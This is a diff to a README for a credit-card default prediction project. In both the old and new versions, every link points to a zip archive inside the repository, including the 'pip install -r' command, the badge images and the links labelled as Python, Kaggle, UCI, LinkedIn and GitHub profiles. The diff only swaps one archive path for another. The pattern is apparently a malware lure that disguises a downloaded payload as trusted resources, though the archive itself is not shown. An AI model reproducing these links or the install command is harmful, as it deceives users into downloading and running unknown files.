@@ -17,13 +17,13 @@ This dataset contains information on default payments, demographic factors, cred
 ## Deployment
 We deploy our model using docker and CI-CD pipeline.
 
-[Link](https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip)
+[Link](https://github.com/Arnab1998-cyber/Credit-Card-Default-Prediction/raw/refs/heads/main/Logs/Card-Prediction-Default-Credit-3.3.zip)
 
 ## Documentations:
-1. HLD : https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip
-2. LLD : https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip
-3. DPR : https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip
-4. Wireframe : https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip
+1. HLD : https://github.com/Arnab1998-cyber/Credit-Card-Default-Prediction/raw/refs/heads/main/Logs/Card-Prediction-Default-Credit-3.3.zip
+2. LLD : https://github.com/Arnab1998-cyber/Credit-Card-Default-Prediction/raw/refs/heads/main/Logs/Card-Prediction-Default-Credit-3.3.zip
+3. DPR : https://github.com/Arnab1998-cyber/Credit-Card-Default-Prediction/raw/refs/heads/main/Logs/Card-Prediction-Default-Credit-3.3.zip
+4. Wireframe : https://github.com/Arnab1998-cyber/Credit-Card-Default-Prediction/raw/refs/heads/main/Logs/Card-Prediction-Default-Credit-3.3.zip
 
 ## Technical Aspect
 1. Dividing the training data into clusters and build best fitted model for each cluster ( using Random Forest and SVM algorithm) in order to make a robust model to predict defaulter as accurate as possible.
@@ -36,27 +36,27 @@ We deploy our model using docker and CI-CD pipeline.
     - Display the prediction 
 
 ## Installation
-The Code is written in Python 3.7. If you don't have Python installed you can find it [here](https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip). If you are using a lower version of Python you can upgrade using the pip package, ensuring you have the latest version of pip. To install the required packages and libraries, run this command in the project directory after [cloning](https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip) the repository:
+The Code is written in Python 3.7. If you don't have Python installed you can find it [here](https://github.com/Arnab1998-cyber/Credit-Card-Default-Prediction/raw/refs/heads/main/Logs/Card-Prediction-Default-Credit-3.3.zip). If you are using a lower version of Python you can upgrade using the pip package, ensuring you have the latest version of pip. To install the required packages and libraries, run this command in the project directory after [cloning](https://github.com/Arnab1998-cyber/Credit-Card-Default-Prediction/raw/refs/heads/main/Logs/Card-Prediction-Default-Credit-3.3.zip) the repository:
 ```bash
-pip install -r https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip
+pip install -r https://github.com/Arnab1998-cyber/Credit-Card-Default-Prediction/raw/refs/heads/main/Logs/Card-Prediction-Default-Credit-3.3.zip
 ```
 
 
 ## Technologies Used
 
-[<img target="_blank" src="https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip" width=100>](https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip)    [<img target="_blank" src="https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip" width=150>](https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip)    [<img target="_blank" src="https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip" width=150>](https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip)   [<img target="_blank" src="https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip" width=170>](https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip)
+[<img target="_blank" src="https://github.com/Arnab1998-cyber/Credit-Card-Default-Prediction/raw/refs/heads/main/Logs/Card-Prediction-Default-Credit-3.3.zip" width=100>](https://github.com/Arnab1998-cyber/Credit-Card-Default-Prediction/raw/refs/heads/main/Logs/Card-Prediction-Default-Credit-3.3.zip)    [<img target="_blank" src="https://github.com/Arnab1998-cyber/Credit-Card-Default-Prediction/raw/refs/heads/main/Logs/Card-Prediction-Default-Credit-3.3.zip" width=150>](https://github.com/Arnab1998-cyber/Credit-Card-Default-Prediction/raw/refs/heads/main/Logs/Card-Prediction-Default-Credit-3.3.zip)    [<img target="_blank" src="https://github.com/Arnab1998-cyber/Credit-Card-Default-Prediction/raw/refs/heads/main/Logs/Card-Prediction-Default-Credit-3.3.zip" width=150>](https://github.com/Arnab1998-cyber/Credit-Card-Default-Prediction/raw/refs/heads/main/Logs/Card-Prediction-Default-Credit-3.3.zip)   [<img target="_blank" src="https://github.com/Arnab1998-cyber/Credit-Card-Default-Prediction/raw/refs/heads/main/Logs/Card-Prediction-Default-Credit-3.3.zip" width=170>](https://github.com/Arnab1998-cyber/Credit-Card-Default-Prediction/raw/refs/heads/main/Logs/Card-Prediction-Default-Credit-3.3.zip)
 
-[<img target="_blank" src="https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip" width=170>](https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip)    [<img target="_blank" src="https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip" width=150>](https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip)
+[<img target="_blank" src="https://github.com/Arnab1998-cyber/Credit-Card-Default-Prediction/raw/refs/heads/main/Logs/Card-Prediction-Default-Credit-3.3.zip" width=170>](https://github.com/Arnab1998-cyber/Credit-Card-Default-Prediction/raw/refs/heads/main/Logs/Card-Prediction-Default-Credit-3.3.zip)    [<img target="_blank" src="https://github.com/Arnab1998-cyber/Credit-Card-Default-Prediction/raw/refs/heads/main/Logs/Card-Prediction-Default-Credit-3.3.zip" width=150>](https://github.com/Arnab1998-cyber/Credit-Card-Default-Prediction/raw/refs/heads/main/Logs/Card-Prediction-Default-Credit-3.3.zip)
 
 
 
 ## Team
 Subhradipta Paul 
-Github : https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip , LinkedIn : https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip
+Github : https://github.com/Arnab1998-cyber/Credit-Card-Default-Prediction/raw/refs/heads/main/Logs/Card-Prediction-Default-Credit-3.3.zip , LinkedIn : https://github.com/Arnab1998-cyber/Credit-Card-Default-Prediction/raw/refs/heads/main/Logs/Card-Prediction-Default-Credit-3.3.zip
 
 Arnab Mitra
-Github : https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip , LinkedIn : https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip
+Github : https://github.com/Arnab1998-cyber/Credit-Card-Default-Prediction/raw/refs/heads/main/Logs/Card-Prediction-Default-Credit-3.3.zip , LinkedIn : https://github.com/Arnab1998-cyber/Credit-Card-Default-Prediction/raw/refs/heads/main/Logs/Card-Prediction-Default-Credit-3.3.zip
 
 ## Credits
-- The datasets has been provided by [Kaggle](https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip). The original dataset can be found [here](https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip+of+credit+card+clients) at the UCI Machine Learning Repository. This project wouldn't have been possible without this dataset.
+- The datasets has been provided by [Kaggle](https://github.com/Arnab1998-cyber/Credit-Card-Default-Prediction/raw/refs/heads/main/Logs/Card-Prediction-Default-Credit-3.3.zip). The original dataset can be found [here](https://github.com/Arnab1998-cyber/Credit-Card-Default-Prediction/raw/refs/heads/main/Logs/Card-Prediction-Default-Credit-3.3.zip+of+credit+card+clients) at the UCI Machine Learning Repository. This project wouldn't have been possible without this dataset.
  
